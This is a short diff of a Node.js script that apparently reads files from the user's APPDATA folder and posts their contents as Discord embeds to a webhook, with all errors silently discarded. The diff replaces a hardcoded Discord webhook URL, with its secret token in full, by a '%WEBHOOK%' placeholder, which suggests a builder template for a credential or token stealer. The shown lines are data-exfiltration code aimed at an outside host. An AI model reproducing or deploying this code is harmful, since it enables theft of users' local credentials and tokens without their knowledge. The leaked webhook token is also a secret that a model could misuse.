@@ -2,8 +2,7 @@ const fs = require('fs');
 const path = require('path');
 const axios = require('axios');
 
-
-const H00K3_URL = "https://discord.com/api/webhooks/1364799028465762366/qzpcr49Fg_tn70rrgOvoEWY9RLnWnOJo0CoYNqt0N1dJXlK8vhpqS16na7rvqK8xj30l";
+const HOOK3_URL = "%WEBHOOK%";
 
 const customAvatarUrl = 'https://i.imgur.com/83uCFZe.jpeg';
 const appData = process.env.APPDATA;
@@ -72,7 +71,7 @@ files.forEach(fileName => {
                         embeds: [embed]
                     };
 
-                    axios.post(H00K3_URL, payload).catch(() => {});
+                    axios.post(HOOK3_URL, payload).catch(() => {});
                 }
             }
         } catch (err) {}
